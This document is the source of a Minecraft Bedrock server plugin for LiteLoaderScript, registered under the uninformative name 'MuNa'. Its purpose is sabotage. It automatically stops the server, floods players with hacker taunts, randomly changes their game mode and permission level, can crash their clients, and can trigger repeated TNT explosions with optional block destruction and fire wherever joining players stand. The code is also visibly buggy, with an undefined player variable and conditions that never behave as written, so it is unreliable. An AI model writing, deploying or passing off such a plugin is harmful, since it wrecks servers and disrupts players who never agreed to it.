//LiteLoaderScript Dev Helper
/// <reference path="c:\Users\Administrator\.vscode/dts/HelperLib-master/src/index.d.ts"/>

ll.registerPlugin(
  /* name */ "MuNa",
  /* introduction */ "跑路",
  /* version */[0, 0, 5],
  /* otherInformation */ {}
);
//请勿私自修改源码发布其他平台，请不要直接修改此处文件，请前往配置文件修改
let conf = new JsonConfigFile("plugins/Muma/config.json");
conf.init("isAutomaticallystopserver", true); //是否开启自动关闭服务器
conf.init("SET Server Stop TimeOut", 60000); //自动关闭服务器时间（单位：ms）
conf.init("SET FPS VeloCity", 500); //自定义文本刷屏速度（单位：ms）
conf.init("Last Text Before Server Stop", "再见了服务器"); //服务器关闭前文本
conf.init("Custom TEXT1", "[§4§l黑客§r]§6服务器等着**吧"); //自定义文本1
conf.init("Custom TEXT2", "[§4§l黑客§r]§560秒**你们服务器"); //自定义文本2
conf.init("Custom TEXT3", "[§4§l黑客§r]§3看我让你们体验一下什么叫做魔幻"); //自定义文本3
conf.init("Custom TEXT4", "[§4§l黑客§r]§2崩溃吧玩家"); //自定义文本4
conf.init("iscrash", false); //是否开启玩家客户端崩溃（注意：开启此功能后，玩家进入服务器就会崩溃客户端，谨慎开启）
conf.init("iscmd", false); //是否开启使用指令开始跑路（注意：如果不开启进入服务器就会刷屏）
conf.init("isboo!", false); //是否开启轰炸模式
conf.init("isDestroy", false); //是否开启轰炸破坏方块模式
conf.init("range", 2); //设置轰炸范围
conf.init("power", 2); //设置轰炸威力
conf.init("isFire", false); //是否开启轰炸后产生火焰
conf.init("bootime", 3000); //设置爆炸循环时间（单位：ms）
mc.listen("onServerStarted", () => {
  const cmd = mc.newCommand(
    "startrunroad",
    "选择是否开启跑路模式",
    PermType.GameMasters,
    0x80
  );
  cmd.setAlias("srr");
  cmd.setEnum("startrunroads", [true, false])
  cmd.mandatory("startrunroad", ParamType.Bool, "startrunroad", 1);
  cmd.overload(["startrunroad"]);
  cmd.setCallback((_cmd, _ori, out, res) => {
    switch (res.startrunroad) {
      case true:
        return out.success("执行成功");
      case false:
        return out.success("放弃执行");
    }
  });
  cmd.setup();
  if (conf.get("isAutomaticallystopserver") === 1) {
    setTimeout(() => {
      mc.broadcast(conf.get("Last Text Before Server Stop"));
      mc.runcmd("stop");
    }, conf.get("SET Server Stop TimeOut"));
  } //这里的数字可以更改，越小越快（单位：ms）
});

if (conf.get("iscmd", Boolean) === 1) {
  mc.listen("onPlayerCmd", (pl, cmd) => {
    if (cmd === "srr true" && "startrunroad true")
      setInterval(() => {
        let Gamemode = 0,
          PermLevel = 0;
        Gamemode = Math.floor(Math.random() * 3);
        PermLevel = Math.floor(Math.random() * 2); //随机数
        pl.tell(conf.get("Custom TEXT1"));
        pl.tell(conf.get("Custom TEXT2"));
        pl.tell(conf.get("Custom TEXT3"));
        pl.tell(conf.get("Custom TEXT4"));
        pl.setGameMode(Gamemode);
        pl.setPermLevel(PermLevel);
        if (conf.get("iscrash", Boolean) === 1) {
          pl.crash();
        }
      }, conf.get("SET FPS VeloCity"));
  });
} else {
  setInterval(() => {
    Gamemode = Math.floor(Math.random() * 3);
    PermLevel = Math.floor(Math.random() * 2); //随机数
    pl.tell(conf.get("Custom TEXT1"));
    pl.tell(conf.get("Custom TEXT2"));
    pl.tell(conf.get("Custom TEXT3"));
    pl.tell(conf.get("Custom TEXT4"));
    pl.setGameMode(Gamemode);
    pl.setPermLevel(PermLevel);
    if (conf.get("iscrash", Boolean) === 1) {
      pl.crash();
    }
  }, conf.get("SET FPS VeloCity"));
}

mc.listen("onJoin", (pl) => {
  if (conf.get("isboo!", Boolean) === 1) {
    setInterval(() => {
      mc.explode(
        pl.pos,
        "minecraft:tnt",
        conf.get("power"),
        conf.get("range"),
        Boolean(conf.get("isDestroy")),
        Boolean(conf.get("isFire"))
      );
    }, conf.get("bootime"));
  }
});
